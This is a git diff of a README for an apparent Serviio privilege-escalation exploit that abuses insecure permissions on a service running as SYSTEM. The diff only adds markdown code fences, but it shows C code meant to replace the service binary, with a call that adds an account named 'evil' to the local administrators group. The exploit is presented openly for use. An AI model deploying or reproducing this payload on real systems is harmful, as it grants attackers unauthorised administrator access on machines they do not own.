@@ -1,7 +1,7 @@
 # ServiioService_PrivEsc
 privilege escalation for Serviio running insecure file permissions on services that run as nt authority\system
 
-
+```
 #include <stdlib.h>
 
 int main ()
@@ -14,9 +14,10 @@ int main ()
 
 	return 0;
 }
+```
 
 # ServiioService_PrivEsc - Second example 
-
+```
 #include <stdlib.h>
 int main ()
 {
@@ -25,4 +26,4 @@ int main ()
 	i = system ("net localgroup administrators evil /add");
 	return 0;
 }
-
+```
